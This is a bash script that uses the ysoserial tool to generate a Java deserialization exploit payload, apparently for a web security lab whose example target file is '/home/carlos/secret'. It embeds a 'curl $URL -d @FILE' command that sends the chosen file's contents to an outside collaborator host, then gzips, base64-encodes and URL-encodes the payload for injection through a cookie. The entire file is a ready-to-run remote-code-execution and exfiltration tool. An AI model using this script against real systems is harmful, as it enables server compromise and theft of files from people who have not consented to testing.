#!/bin/bash

# === Check arguments ===
if [[ $# -ne 3 ]]; then
  echo "Usage:"
  echo "  $0 <Gadget> <FILE> <URL>"
  echo
  echo "Example:"
  echo "  $0 CommonsCollections1 \"/home/carlos/secret\" \"https://abc123.burpcollaborator.net\""
  exit 1
fi

GADGET=$1
COMMAND=$2
URL=$3

# === Path to ysoserial ===
YSOSERIAL_JAR="./ysoserial-all.jar"

# === Output files ===
RAW_PAYLOAD="payload.bin"
GZIPPED_PAYLOAD="payload.gz"
BASE64_PAYLOAD="payload.b64"
FINAL_COMMAND="curl $URL -d @$COMMAND"

# === Generate raw payload ===
echo "[*] Generating payload with ysoserial..."
java -jar "$YSOSERIAL_JAR" "$GADGET" "$FINAL_COMMAND" > "$RAW_PAYLOAD"

if [[ $? -ne 0 ]]; then
  echo "[!] ysoserial failed."
  exit 2
fi

# === Gzip compress ===
echo "[*] Compressing payload..."
gzip -c "$RAW_PAYLOAD" > "$GZIPPED_PAYLOAD"

# === Base64 encode with no line breaks ===
echo "[*] Base64 encoding payload..."
base64 -w 0 "$GZIPPED_PAYLOAD" > "$BASE64_PAYLOAD"

# === Output ===
echo "[+] Done!"
echo "[+] Base64 payload for cookie:"
python3 -c "import urllib.parse; print(urllib.parse.quote(open('$BASE64_PAYLOAD').read()))"
echo
